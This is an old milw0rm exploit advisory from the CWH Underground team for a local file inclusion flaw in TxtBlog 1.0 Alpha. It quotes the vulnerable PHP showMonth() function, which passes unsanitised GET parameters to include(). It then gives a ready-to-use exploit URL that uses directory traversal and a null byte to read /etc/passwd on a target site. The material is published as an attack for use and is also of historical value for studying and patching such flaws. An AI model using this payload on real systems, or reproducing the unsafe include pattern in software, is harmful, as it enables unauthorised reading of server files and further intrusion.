@@ -1,0 +1,70 @@
+============================================================
+  TxtBlog (index.php m) Local File Inclusion Vulnerability
+============================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 27 November 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+ APPLICATION : TxtBlog
+ VERSION     : v.1.0 Alpha
+ DOWNLOAD    : http://downloads.sourceforge.net/txtblogcms/txtblogcms-1.0a.zip
+#####################################################
+
+--- Local File Inclusion ---
+
+-----------------------------
+ Vulnerable File (index.php)
+-----------------------------
+
+function showMonth() {
+	global $config_date_format, $txtblog_body, $txtblog_title, $config_title;
+
+	$txtblog_body = "";
+	$txtblog_title = "$config_title - Archives";
+
+	$year = $_GET['y'];			
+	$month = $_GET['m'];				
+
+	$files = findFiles("data/$year/$month");	<<< BUG !!!!
+	
+	if (isset($files)) {
+	foreach ($files as $file) {
+				
+		include ("data/$year/$month/$file");	<<< BUG !!!!
+		$date_array = explode(" ",$date);
+		$date = date($config_date_format, mktime($date_array[0], $date_array[1], $date_array[2], $date_array[3], $date_array[4], $date_array[5]));
+		$txtblog_body .= "<span class='blog_title'>$title</span><br>\n<span class='blog_date'>$date</span><br>\n".bb2html($blog)."<br>\n<hr size='1'>\n";
+
+	}
+	}
+}
+
+---------
+ Exploit
+---------
+
+[+] http://[Target]/[txtblogcms_path]/index.php?y=2005&m=01/../../../../../../../../etc/passwd%00
+
+
+#######################################################################################
+Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos, Gdiupo, GnuKDE, JK
+Special Thx : asylu3, str0ke, citec.us, milw0rm.com
+#######################################################################################
+
+# milw0rm.com [2008-11-27]
